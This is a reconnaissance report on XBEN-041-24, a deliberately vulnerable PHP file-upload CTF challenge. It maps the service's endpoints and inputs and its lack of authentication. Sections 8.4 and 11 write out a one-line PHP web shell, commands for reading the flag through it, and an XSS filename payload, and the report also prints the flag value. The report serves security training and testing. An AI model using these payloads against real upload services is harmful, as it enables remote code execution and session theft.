# Reconnaissance Deliverable: XBEN-041-24 Image Upload Service

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on the complete absence of authorization controls.

**Key Finding: NO AUTHORIZATION OR AUTHENTICATION EXISTS**
This is a deliberately vulnerable PHP file upload application with a single endpoint, no user management, and complete public access to all functionality including remote code execution via PHP file upload.

**Key Sections:**
- **Section 2 (Technology Stack):** PHP 7.1.33 (EOL), Apache 2.4.38, Debian Buster - all outdated
- **Section 3 (Authentication Flow):** NO authentication exists - all functionality is publicly accessible
- **Section 4 (API Inventory):** Single POST endpoint for file upload, single GET endpoint for display - both public
- **Section 5 (Input Vectors):** File upload vector with minimal sanitization leads to RCE and XSS
- **Section 7 (Role Architecture):** NO roles exist - flat access model where all visitors have unrestricted access
- **Section 8 (Authorization Candidates):** NO authorization to test - immediate RCE access available
- **Section 9 (Injection Sources):** NO command or SQL injection sinks - application uses only file operations

**Priority for Testing:** 
1. Remote Code Execution via PHP file upload (CRITICAL - immediate access)
2. Stored XSS via malicious filenames
3. File overwrite attacks

**How to Use This Report:** 
Start with Section 4 (API Endpoint Inventory) to understand the attack surface, then proceed to Section 5 (Input Vectors) for exploitation paths. Sections 7-8 document the complete absence of authorization controls.

## 1. Executive Summary
XBEN-041-24 is a deliberately vulnerable PHP file upload application designed as a security training challenge (CTF). The application consists of a single 44-line PHP file with **NO authentication, NO authorization, NO input validation, and NO output encoding**. The primary attack vector is unrestricted file upload leading to immediate remote code execution by uploading PHP web shells. The application runs on an end-of-life technology stack (PHP 7.1.33, EOL November 2019) with no security patches available.

**Core Functionality:**
- File upload form (GET /)
- File upload processing (POST /)
- Uploaded file serving (/upload/{filename})
- Direct PHP code execution for uploaded .php files

**Critical Vulnerabilities:**
- **Remote Code Execution (RCE):** Unrestricted PHP file upload enables immediate code execution
- **Stored XSS:** User-controlled filenames reflected without sanitization in HTML contexts
- **NO Authentication:** All endpoints publicly accessible
- **NO Authorization:** No access control mechanisms exist
- **Plaintext Secrets:** CTF flag stored in Docker environment variables

**Technology Stack:**
- **Frontend:** Raw HTML (no framework)
- **Backend:** PHP 7.1.33 (5+ years past EOL), Apache 2.4.38, Debian Buster
- **Infrastructure:** Docker container, port 80 exposed to host port 44553
- **Database:** NONE - flat file storage only
- **Security Mechanisms:** NONE

## 2. Technology & Service Map
- **Frontend:** Raw HTML5, no JavaScript framework, inline CSS styling
- **Backend:** PHP 7.1.33 (EOL: December 2019), Apache 2.4.38, single-file monolithic architecture
- **Infrastructure:** Docker container (Debian Buster base), Caddy reverse proxy on port 80, application on port 44553
- **Database:** NONE - uses flat file storage (`/var/www/html/upload/uploaded.txt`)
- **Key Dependencies:** PHP core functions only, no Composer packages, no external libraries
- **Identified Subdomains:** NONE - single host deployment (localhost:44553)
- **Open Ports & Services:**
  - **Port 80 (HTTP):** Caddy HTTP server (reverse proxy)
  - **Port 443 (HTTPS):** SSL/HTTPS service
  - **Port 44553:** PHP application (Apache 2.4.38 with mod_php)
  - **Port 9999:** Unknown service with CORS headers
  - **Port 49152:** Tailscale service (requires authentication)

## 3. Authentication & Session Management Flow
**CRITICAL FINDING: NO AUTHENTICATION OR SESSION MANAGEMENT EXISTS**

- **Entry Points:** NONE - no login, registration, or authentication endpoints exist
- **Mechanism:** NONE - the application is completely stateless with no user identity tracking
- **Session Management:** 
  - NO `session_start()` call anywhere in codebase
  - NO `$_SESSION` variable usage
  - NO session cookies created or validated
  - NO session timeout or regeneration
- **Code Pointers:** 
  - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/challenge/index.php` (Lines 1-44) - entire application with NO authentication checks

**Security Implications:**
- Any visitor can upload files without credentials
- No audit trail of who uploaded what
- No rate limiting per user (no user concept exists)
- No access control possible

### 3.1 Role Assignment Process
**FINDING: NO ROLE ASSIGNMENT - ALL VISITORS HAVE UNRESTRICTED ACCESS**

- **Role Determination:** N/A - no roles exist
- **Default Role:** All visitors are treated identically with full access to all operations
- **Role Upgrade Path:** N/A - no privilege levels exist
- **Code Implementation:** No role assignment logic exists in codebase

### 3.2 Privilege Storage & Validation
**FINDING: NO PRIVILEGE STORAGE OR VALIDATION**

- **Storage Location:** N/A - no user privileges exist
- **Validation Points:** NONE - no authorization checks anywhere in application
- **Cache/Session Persistence:** N/A - no sessions exist
- **Code Pointers:** No privilege validation code exists

### 3.3 Role Switching & Impersonation
**FINDING: NO ROLE SWITCHING OR IMPERSONATION FEATURES**

- **Impersonation Features:** NONE
- **Role Switching:** NONE
- **Audit Trail:** NONE - no logging infrastructure exists
- **Code Implementation:** No role switching code exists

## 4. API Endpoint Inventory
**Network Surface Focus:** Only network-accessible endpoints via HTTP to http://localhost:44553 are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | `/` | anon | None | None | Displays upload form and previously uploaded image. See `index.php` lines 7-25. |
| GET | `/index.php` | anon | None | None | Alias for `/` - same functionality. See `index.php` lines 7-25. |
| POST | `/` | anon | None | None | Handles file upload with NO validation. See `index.php` lines 29-41. **CRITICAL: RCE vulnerability** |
| POST | `/index.php` | anon | None | None | Alias for POST `/` - same upload handler. See `index.php` lines 29-41. |
| GET | `/upload/{filename}` | anon | filename | None | Apache serves uploaded files directly. PHP files are EXECUTED. **CRITICAL: Code execution** |
| GET | `/upload/uploaded.txt` | anon | None | None | Apache serves tracking file containing most recent filename. Readable by anyone. |

**Endpoint Analysis:**
- **Total Endpoints:** 3 unique functional endpoints (/, /index.php is alias, /upload/*)
- **Authentication Required:** 0 endpoints
- **Authorization Required:** 0 endpoints
- **Public Access:** 100% of endpoints

**Object ID Analysis:**
- **Endpoints with Object IDs:** 1 (`/upload/{filename}`)
- **Ownership Validation:** NONE - any visitor can access any file if filename is known
- **IDOR Risk:** HIGH - direct file access without authorization checks

## 5. Potential Input Vectors for Vulnerability Analysis
**Network Surface Focus:** Only input vectors from network-accessible HTTP endpoints are included.

### URL Parameters
**FINDING: NONE - Application does not use $_GET or URL parameters**

### POST Body Fields (Multipart Form Data)
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/challenge/index.php`

1. **$_FILES['userfile']['name']** (Lines 31, 34, 36, 37)
   - **User Controllable:** YES (original filename from client)
   - **Sanitization:** Minimal - only `basename()` applied at line 31
   - **Usage:** File path construction (line 31), plaintext storage (line 34), HTML output (lines 15, 37)
   - **Vulnerabilities:** XSS (lines 15, 37), file extension bypass (line 32), path traversal partially mitigated

2. **$_FILES['userfile']['tmp_name']** (Line 32)
   - **User Controllable:** NO (PHP-managed temporary path)
   - **Usage:** Source path for `move_uploaded_file()`

3. **$_FILES['userfile']['type']** (Never accessed)
   - **User Controllable:** YES (MIME type from client)
   - **Validation:** NONE - never checked
   - **Risk:** MIME type spoofing possible but irrelevant since no validation exists

4. **$_FILES['userfile']['size']** (Never accessed)
   - **User Controllable:** NO (file size)
   - **Validation:** NONE - never checked
   - **Risk:** DoS via disk exhaustion

5. **File Content** (Implicit in uploaded file, line 32)
   - **User Controllable:** YES (entire file content)
   - **Validation:** NONE - no magic byte checking, no content scanning
   - **Usage:** Stored to `/var/www/html/upload/{filename}` and executed if .php extension
   - **Vulnerabilities:** Remote Code Execution (RCE) via PHP web shell upload

### HTTP Headers
**FINDING: NONE - Application does not read $_SERVER headers**
- No User-Agent processing
- No X-Forwarded-For processing
- No custom header processing

### Cookie Values
**FINDING: NONE - Application does not use $_COOKIE**
- No authentication cookies
- No preference cookies
- No tracking cookies

### File System State (Indirect Input)
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/challenge/index.php`

6. **Contents of /var/www/html/upload/uploaded.txt** (Lines 12-15)
   - **User Controllable:** YES (indirectly via file upload at line 34)
   - **Sanitization:** NONE when read
   - **Usage:** Read into `$filename` (line 13), output in `<img src>` tag (line 15)
   - **Vulnerabilities:** Stored XSS via malicious filename

## 6. Network & Interaction Map
**Network Surface Focus:** Only components within the deployed, network-accessible infrastructure are mapped.

### 6.1 Entities
| Title | Type | Zone | Tech | Data | Notes |
|---|---|---|---|---|---|
| XBEN-041-24-App | Service | App | PHP 7.1/Apache 2.4 | PII (uploaded files) | Main vulnerable application |
| Caddy-Proxy | Service | Edge | Caddy HTTP | Public | Reverse proxy on port 80 |
| Docker-Host | Service | Infrastructure | Docker | None | Container orchestration |
| Upload-Directory | DataStore | App | Filesystem | User uploads | Stores uploaded files at /var/www/html/upload/ |
| Metadata-File | DataStore | App | Flat file | Filenames | Tracks most recent upload in uploaded.txt |
| Internet-User | ExternAsset | Internet | Browser | None | Unauthenticated visitors |

### 6.2 Entity Metadata
| Title | Metadata Key: Value; Key: Value; Key: Value |
|---|---|
| XBEN-041-24-App | Hosts: `http://localhost:44553`; Endpoints: `/`, `/index.php`, `/upload/*`; Auth: NONE; Dependencies: Upload-Directory, Metadata-File; Vulnerabilities: RCE, XSS, Unrestricted Upload |
| Caddy-Proxy | Hosts: `http://localhost:80`; Protocol: HTTP only (no HTTPS); Forwards: Port 44553; Headers: None (no security headers) |
| Upload-Directory | Path: `/var/www/html/upload/`; Permissions: `www-data:www-data`; Writable: YES; PHP Execution: ENABLED; Access Control: NONE |
| Metadata-File | Path: `/var/www/html/upload/uploaded.txt`; Format: Plain text, single line; Contains: Most recent filename; Overwrite: YES on each upload |

### 6.3 Flows (Connections)
| FROM → TO | Channel | Path/Port | Guards | Touches |
|---|---|---|---|---|
| Internet-User → Caddy-Proxy | HTTPS | `:443` | None | Public |
| Caddy-Proxy → XBEN-041-24-App | HTTP | `:44553` | None | Public |
| Internet-User → XBEN-041-24-App | HTTP | `:44553` direct | None | Public, uploaded files |
| XBEN-041-24-App → Upload-Directory | File I/O | Local filesystem | None | User uploads (any file type) |
| XBEN-041-24-App → Metadata-File | File I/O | Local filesystem | None | Filename metadata |
| Internet-User → Upload-Directory | HTTP | `:44553/upload/*` (Apache static serving) | None | Direct file access, PHP execution |

### 6.4 Guards Directory
| Guard Name | Category | Statement |
|---|---|---|
| None | N/A | **NO GUARDS EXIST** - All flows are completely unrestricted |

**Note:** This application has zero authorization guards, zero authentication requirements, and zero network access controls. All endpoints are publicly accessible without any security checks.

## 7. Role & Privilege Architecture
**CRITICAL FINDING: NO ROLE OR PRIVILEGE ARCHITECTURE EXISTS**

### 7.1 Discovered Roles
| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|---|---|---|---|
| Anonymous Visitor | 0 (but unrestricted access) | Global | No role code exists - all visitors treated identically |

**Note:** Only one implicit "role" exists. All visitors have identical, unrestricted access to all functionality including file upload and code execution.

### 7.2 Privilege Lattice
```
Privilege Ordering: NONE - Flat access model

┌────────────────────────────────────────────┐
│   ALL VISITORS (Anonymous)                  │
│   Privilege: Unrestricted access to:       │
│   - File upload (RCE risk)                  │
│   - File viewing                            │
│   - File overwrite                          │
│   - PHP code execution                      │
└────────────────────────────────────────────┘

No hierarchy exists. No role switching possible.
```

### 7.3 Role Entry Points
| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|---|---|---|---|
| Anonymous | `/` | `/*` (all routes) | NONE |

### 7.4 Role-to-Code Mapping
| Role | Middleware/Guards | Permission Checks | Storage Location |
|---|---|---|---|
| Anonymous | NONE | NONE | N/A - no role storage exists |

## 8. Authorization Vulnerability Candidates
**CRITICAL FINDING: NO AUTHORIZATION EXISTS TO TEST**

Since this application has NO authentication or authorization mechanisms, traditional authorization testing is not applicable. However, the **complete absence of authorization is itself the critical vulnerability**.

### 8.1 Horizontal Privilege Escalation Candidates
**FINDING: NO TRADITIONAL HORIZONTAL ESCALATION POSSIBLE**

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|---|---|---|---|---|
| N/A | No user-to-user boundaries exist | N/A | N/A | All functionality is public |

**Indirect IDOR:**
- **Pattern:** `/upload/{filename}`
- **Risk:** Medium - files accessible if filename is known/guessed
- **Note:** Not traditional horizontal escalation since there are no users

### 8.2 Vertical Privilege Escalation Candidates
**FINDING: NO VERTICAL ESCALATION POSSIBLE**

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|---|---|---|---|
| N/A | No privileged roles exist | All functionality publicly accessible | N/A |

**Key Insight:** Attackers START with maximum access (unrestricted file upload → RCE). There are no higher privilege levels to escalate to.

### 8.3 Context-Based Authorization Candidates
**FINDING: NO CONTEXT-BASED AUTHORIZATION**

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|---|---|---|---|
| N/A | No multi-step workflows | N/A | N/A |

**Note:** File upload is a single-step operation with no workflow state validation.

### 8.4 Primary Attack Path (Direct Access, No Authorization Bypass Needed)
```
1. Attacker uploads shell.php containing: <?php system($_GET['cmd']); ?>
2. Attacker accesses: http://localhost:44553/upload/shell.php?cmd=whoami
3. Result: Command execution as www-data user
4. Attacker retrieves flag: http://localhost:44553/upload/shell.php?cmd=printenv%20FLAG
5. Result: flag{dc97f359-f228-492b-b344-038f3d712a73}
```

**No authorization bypass techniques required** - immediate access to RCE.

## 9. Injection Sources (Command Injection and SQL Injection)
**Network Surface Focus:** Only injection sources from network-accessible endpoints are reported.

### Command Injection Sources
**FINDING: ZERO COMMAND INJECTION SOURCES**

**Search Methodology:**
- Searched for: `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`, `proc_open()`, backtick operator
- Result: NONE FOUND

**Evidence:**
The application uses only native PHP file operations that do not invoke system shells:
- `move_uploaded_file()` (line 32)
- `fopen()`, `fgets()`, `fwrite()`, `fclose()` (lines 12-14, 33-35)
- `basename()` (line 31)
- `file_exists()` (line 11)

**Conclusion:** The application does NOT execute shell commands. No command injection vectors exist.

### SQL Injection Sources
**FINDING: ZERO SQL INJECTION SOURCES**

**Search Methodology:**
- Searched for: `mysqli_query()`, `mysql_query()`, `pg_query()`, `PDO`, `SELECT`, `INSERT`, `UPDATE`, `DELETE`
- Result: NONE FOUND

**Evidence:**
- No database connection code exists
- No SQL queries of any kind
- Docker configuration shows NO database service
- All data persistence uses flat file storage (`uploaded.txt`)

**Conclusion:** The application does NOT use a database. No SQL injection vectors exist.

### Other Injection Considerations
**File Upload RCE:** While not traditional command/SQL injection, the unrestricted PHP file upload enables remote code execution:
- **Source:** `$_FILES['userfile']` (lines 29-41)
- **Sink:** `move_uploaded_file()` storing PHP files in web-accessible directory
- **Exploitation:** Upload `shell.php` → Access `/upload/shell.php` → Arbitrary code execution

**XSS (Not Injection, But Related):**
- **Source:** `$_FILES['userfile']['name']` (line 34) → `uploaded.txt` → `$filename` (line 13)
- **Sink:** `echo "<img src=\"upload/" . $filename . "\">` (line 15)
- **Type:** Stored XSS via unsanitized filename

## 10. Additional Security Findings

### 10.1 Technology Stack Vulnerabilities
- **PHP 7.1.33:** End-of-life since December 2019 (5+ years), multiple unpatched CVEs
- **Apache 2.4.38:** Known vulnerabilities (CVE-2019-10092, CVE-2019-10098)
- **Debian Buster:** End-of-life, using archived repositories

### 10.2 Missing Security Controls
- ❌ NO authentication mechanisms
- ❌ NO authorization checks
- ❌ NO CSRF protection
- ❌ NO file type validation
- ❌ NO MIME type validation
- ❌ NO file size limits
- ❌ NO output encoding (XSS vulnerabilities)
- ❌ NO security headers (CSP, X-Frame-Options, etc.)
- ❌ NO rate limiting
- ❌ NO logging or audit trails
- ❌ NO TLS/HTTPS (port 80 only)

### 10.3 Secrets Management
**CTF Flag Storage:**
- **Location:** Docker environment variable `FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}`
- **Retrieval:** Upload PHP shell → Execute `printenv FLAG` or `<?php echo getenv('FLAG'); ?>`
- **Risk:** CRITICAL - flag retrievable via RCE

### 10.4 File Locations
**Critical Files:**
- **Application:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/challenge/index.php`
- **Apache Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/apache/000-default.conf`
- **Dockerfile:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/Dockerfile`
- **Flag Storage:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/.env`

## 11. Recommended Testing Priorities

### Priority 1: Remote Code Execution (CRITICAL)
1. Upload PHP web shell via POST to `/`
2. Access uploaded shell at `/upload/shell.php`
3. Execute commands to retrieve FLAG from environment

### Priority 2: Stored XSS (HIGH)
1. Upload file with malicious filename: `test.jpg" onerror="alert(document.cookie)"`
2. Verify XSS triggers when viewing uploaded image

### Priority 3: File Overwrite (MEDIUM)
1. Upload file named `uploaded.txt` to overwrite metadata file
2. Upload file with existing name to overwrite previous uploads

### Priority 4: Denial of Service (LOW)
1. Upload large files to exhaust disk space
2. Rapid successive uploads to overload server

## 12. Summary

**Application Type:** Deliberately vulnerable PHP file upload application (CTF challenge)

**Attack Surface:** 
- 3 network-accessible endpoints (all public, no authentication)
- 1 critical input vector (file upload)
- 0 authorization controls
- 0 authentication mechanisms

**Critical Vulnerabilities:**
1. **Remote Code Execution** - Unrestricted PHP file upload
2. **Stored XSS** - Unsanitized filename output
3. **No Access Control** - Complete absence of authentication/authorization
4. **Information Disclosure** - CTF flag in environment variables

**Primary Attack Path:**
Upload PHP shell → Access via /upload/shell.php → Execute commands → Retrieve FLAG from environment

**Complexity:** MINIMAL - No authentication bypass, no authorization bypass, no sophisticated exploitation required

**Risk Level:** CRITICAL - Immediate remote code execution available to anonymous users